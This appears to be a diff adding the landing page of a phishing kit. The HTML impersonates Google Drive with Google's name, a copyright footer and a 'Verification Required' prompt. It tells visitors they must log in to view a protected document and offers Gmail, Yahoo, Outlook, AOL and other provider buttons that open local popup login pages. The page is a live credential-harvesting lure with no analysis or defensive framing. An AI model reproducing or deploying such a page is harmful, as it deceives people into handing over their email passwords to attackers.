@@ -1,0 +1,136 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+  <title>
+   Google Drive - Online documents, spreadsheets, presentations, surveys, file storage and more
+  </title>
+  <link rel="shortcut icon" href="images/favicon.ico" />
+  <link rel="stylesheet" href="css/style.css" />
+  <link rel="stylesheet" href="css/styleTinybox.css" />
+  <script src="js/jquery.min.js" type="text/javascript">
+  </script>
+  <script src="js/popup.js" type="text/javascript">
+  </script>
+  <script src="js/global.js" type="text/javascript">
+  </script>
+  <script language="Javascript">
+   function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
+{
+   if (left == -1)
+   {
+      left = (screen.width/2)-(width/2);
+   }
+   if (top == -1)
+   {
+      top = (screen.height/2)-(height/2);
+   }
+   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
+}
+  </script>
+ </head>
+ <body onload="openOffersDialog();">
+  <div id="maincover">
+   <img width="217" height="52" src="images/header.jpg" />
+   <div class="line">
+   </div>
+   <div id="dropboxmaincontent">
+    <table>
+     <tbody>
+      <tr>
+       <td valign="middle" class="mainlogo">
+        <img width="380" height="300" src="images/logo.png" />
+       </td>
+       <td valign="top">
+        <h1>
+         Verification Required
+        </h1>
+        <h2>
+         * To sync a protected document, you need to log in
+        </h2>
+        <h5>
+         Select your email provider to continue:
+        </h5>
+        <table>
+         <tbody>
+          <tr>
+           <td>
+            <a target="_self" href="javascript:popupwnd('gmail.htm','no','no','no','no','no','no','900','100','400','400')">
+             <img width="132" height="48" border="0" title="GMail" src="images/gmail.png" id="displayText" />
+            </a>
+           </td>
+           <td>
+            <a target="_self" href="javascript:popupwnd('yahoo.htm','no','no','no','no','no','no','900','100','400','400')">
+             <img width="132" height="48" border="0" title="Yahoo!" src="images/yahoo.png" id="displayText" />
+            </a>
+           </td>
+          </tr>
+          <tr>
+           <td>
+            <a target="_self" href="javascript:popupwnd('outlook.htm','no','no','no','no','no','no','900','100','400','400')">
+             <img width="132" height="48" border="0" title="Outlook" src="images/outlook.png" id="displayText" />
+            </a>
+           </td>
+           <td>
+            <a target="_self" href="javascript:popupwnd('aol.htm','no','no','no','no','no','no','900','100','400','400')">
+             <img width="132" height="48" border="0" title="Aol" src="images/aol.png" id="displayText" />
+            </a>
+           </td>
+          </tr>
+          <tr>
+           <td>
+            <a target="_self" href="javascript:popupwnd('other.htm','no','no','no','no','no','no','900','100','400','400')">
+             <img width="132" height="48" border="0" title="Other Email Providers" src="images/other.png" id="displayText" />
+            </a>
+           </td>
+           <td>
+           </td>
+          </tr>
+         </tbody>
+        </table>
+       </td>
+      </tr>
+     </tbody>
+    </table>
+   </div>
+   <script src="js/tinybox.js" type="text/javascript">
+   </script>
+   <div id="overlay" class="overlay">
+   </div>
+   <!---<a onclick="openOffersDialog2();">Click Here To See The PopUp</a> //--->
+   <div id="boxpopup" class="box">
+    <div id="content">
+     <!--?php include('form.php');?-->
+    </div>
+   </div>
+  </div>
+  <br />
+  <br />
+  <br />
+  <br />
+  <br />
+  <br />
+  <br />
+  <center>
+   <h2>
+    ©2015 Google Inc.
+    <br />
+    <img width="230" height="15" src="images/logo_strip_2x.png" />
+   </h2>
+  </center>
+  <p>
+  </p>
+  <p>
+  </p>
+  <p>
+  </p>
+  <p>
+  </p>
+  <p>
+  </p>
+  <p>
+  </p>
+  <p>
+  </p>
+ </body>
+</html>
